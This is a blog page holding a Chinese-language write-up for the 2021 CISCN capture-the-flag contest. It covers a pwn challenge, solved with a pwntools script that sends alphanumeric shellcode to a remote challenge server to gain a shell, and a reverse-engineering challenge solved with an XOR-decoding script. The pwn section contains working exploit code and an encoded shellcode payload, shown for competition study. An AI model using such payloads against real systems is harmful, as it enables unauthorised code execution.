<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;p&gt;菜&lt;/p&gt;
&lt;h2 id=&#34;PWN&#34;&gt;&lt;a href=&#34;#PWN&#34; class=&#34;headerlink&#34; title=&#34;PWN&#34;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&#34;login-nomal&#34;&gt;&lt;a href=&#34;#login-nomal&#34; class=&#34;headerlink&#34; title=&#34;login-nomal&#34;&gt;&lt;/a&gt;login-nomal&lt;/h3&gt;&lt;p&gt;就就就，以这样的形式输入&lt;/">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>2021ciscn wp | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/06/01/guosai1/">2021ciscn wp</a></h1>
  <aside>
    
    <time datetime="222022-06-01">
      June 1st 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/writeup/">writeup</a></li>
    
    </ul>
  </aside>
</header>

  <div><p>菜</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h3><p>就就就，以这样的形式输入</p>
<p>opt:1\r\nmsg:aaaa\r\n</p>
<p>分析之后发现我们只需要输入</p>
<p>opt:1\r\nmsg:ro0t\r\n，就可以进入2选项，然后有一个地址上的执行</p>
<p>就在上面写shellcode（需要时ascii的shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#encoding = utf-8</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line"><span class="meta">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;59.110.24.117&#x27;</span>, <span class="number">44943</span>)</span><br><span class="line"><span class="meta">#p = process(<span class="string">&#x27;./login&#x27;</span>)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.33.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = lambda name,addr          :<span class="built_in">log</span>.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">pl = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">&#x27;opt:2\r\nmsg:&#x27;</span>+pl+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>发现了数据</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220529192551-v0drnpk.png" alt="image.png"></p>
<p>然后ast还原得到逻辑</p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000041765775">逆向进阶，利用 AST 技术还原 JavaScript 混淆代码 - SegmentFault 思否</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">check</span><span class="params">(encoded: String, keyValue: String)</span>&#123;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是个异或</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag = [88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16]</span></span><br><span class="line"><span class="string">key = [51,52,53,121]</span></span><br><span class="line"><span class="string">for i in range(len(flag)-4+1):</span></span><br><span class="line"><span class="string">    key[0], key[1], key[2], key[3] = key[1], key[2], key[3], key[0]</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">for i in range(38, -1, -1):</span></span><br><span class="line"><span class="string">    key[1], key[2], key[3], key[0] = key[0], key[1], key[2], key[3]</span></span><br><span class="line"><span class="string">    r1 = flag[i+3] ^ key[3]</span></span><br><span class="line"><span class="string">    r0 = flag[i+2] ^ key[2]</span></span><br><span class="line"><span class="string">    r3 = (0xff &amp; (key[1] + (r1 &gt;&gt; 2))) ^ flag[i+1]</span></span><br><span class="line"><span class="string">    r2 = (0xff &amp; (key[0] + (r0 &gt;&gt; 4))) ^ flag[i+0]</span></span><br><span class="line"><span class="string">    flag[i+0], flag[i+1], flag[i+2], flag[i+3] = r0, r1, r2, r3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for n in range(len(flag)):</span></span><br><span class="line"><span class="string">    flag2 += chr(flag[n])</span></span><br><span class="line"><span class="string">print(flag2)</span></span><br></pre></td></tr></table></figure>

</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
